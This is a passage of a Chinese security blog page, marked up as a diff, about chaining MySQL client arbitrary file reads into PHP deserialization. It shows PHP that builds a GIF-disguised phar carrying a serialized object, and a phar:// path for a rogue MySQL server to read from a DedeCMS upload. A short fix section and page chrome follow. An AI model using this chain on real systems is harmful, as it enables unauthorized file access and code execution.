class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头</span><br><span class="line">$o = new Control();</span><br><span class="line">$phar-&gt;setMetadata($o); //将自定义meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">//签名自动计算</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>然后我们可以直接通过前台上传头像来传文件，或者直接后台也有文件上传接口，然后将rogue mysql server来读取这个文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phar://./dedecms.phar/test.txt</span><br></pre></td></tr></table></figure>
+<p>监听5555可以收到</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gb4hjpf8ihj30pl078wfa.jpg" alt="12.png"></p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gb4hk9km5vj30rg0er0um.jpg" alt="13.png"></p>
+<h2 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h2><p>对于大多数mysql的客户端来说，load file local是一个无用的语句，他的使用场景大多是用于传输数据或者上传数据等。对于客户端来说，可以直接关闭这个功能，并不会影响到正常的使用。</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/mysqlc/">Mysql Client 任意文件读取攻击链拓展</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 冷逸 的个人博客">冷逸</a></p>
+  <p><span>发布时间:</span>2020年01月21日 - 21:01</p>
+  <p><span>最后更新:</span>2020年01月21日 - 21:01</p>
+  <p><span>原始链接:</span><a href="/mysqlc/" title="Mysql Client 任意文件读取攻击链拓展">https://lengjibo.github.io/mysqlc/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://lengjibo.github.io/mysqlc/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
+
+
+      
+    </div>
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #555;font-size:14px;">-------------The End-------------</div>
+    
+</div>
+
+      
+    </div>
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.png" alt="冷逸 WeChat Pay"/>
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/zhifubao.jpg" alt="冷逸 Alipay"/>
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div class="social_share">
+            
+               <div>
+                 
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+               </div>
+            
+            
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/vuln/" rel="next" title="Vulnhub靶机之sunsetsunrise">
+                <i class="fa fa-chevron-left"></i> Vulnhub靶机之sunsetsunrise
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/webconf/" rel="prev" title="web.config在渗透中的作用">
+                web.config在渗透中的作用 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Daftar Isi
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Ikhtisar
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg"
+                alt="冷逸" />
+            
+              <p class="site-author-name" itemprop="name">冷逸</p>
+              <p class="site-description motion-element" itemprop="description">做一个温柔的人...</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">74</span>
+                    <span class="site-state-item-name">posting</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-name">kategori</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">106</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/../../.deploy_git/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/lengjibo" target="_blank" title="GitHub"><i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="qqlengyi@163.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-globe"></i>E-Mail</a>
+                  
+                </span>
+              
+            </div>
+          
+        <div id="music163player">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=110 src="https://music.163.com/outchain/player?type=0&id=377079922&auto=1&height=90"></iframe>
+          </div>
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.zfsec.cn/" title="青春's blog" target="_blank">青春's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.addon.pub/" title="Yokeen's blog" target="_blank">Yokeen's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://freeerror.org/" title="之乎者也's blog" target="_blank">之乎者也's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.bugbank.cn/team/FrigidSword" title="漏洞银行" target="_blank">漏洞银行</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.vulbox.com/team/Frigid%20Sword%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F" title="漏洞盒子" target="_blank">漏洞盒子</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://godpang.github.io/" title="Mr.赵" target="_blank">Mr.赵</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://amliaw4.github.io/" title="amliaW4'S Blog" target="_blank">amliaW4'S Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.se7ensec.cn/" title="se7en's Blog" target="_blank">se7en's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ninjia.gitbook.io/secskill/" title="secskill" target="_blank">secskill</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.bug1024.cn/" title="ibug" target="_blank">ibug</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://wwcx.org/" title="Strjziny's Blog" target="_blank">Strjziny's Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Load-data-infile"><span class="nav-number">1.</span> <span class="nav-text">Load data infile</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#流程"><span class="nav-number">2.</span> <span class="nav-text">流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POC"><span class="nav-number">3.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#影响范围"><span class="nav-number">4.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#拓展"><span class="nav-number">5.</span> <span class="nav-text">拓展</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2019-12086-jackson任意文件读取漏洞"><span class="nav-number">5.1.</span> <span class="nav-text">CVE-2019-12086 jackson任意文件读取漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#任意文件读-with-配置文件泄露"><span class="nav-number">5.2.</span> <span class="nav-text">任意文件读 with 配置文件泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#任意文件读-to-反序列化"><span class="nav-number">5.3.</span> <span class="nav-text">任意文件读 to 反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反序列化-to-RCE"><span class="nav-number">5.4.</span> <span class="nav-text">反序列化 to RCE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#修复方式"><span class="nav-number">6.</span> <span class="nav-text">修复方式</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2014 – <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">冷逸</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Tema – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Muse</a> v6.4.0</div>
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv" title="Total Visitors">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="site-pv" title="Total Views">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.ui.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_sphere.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/love.js"></script>
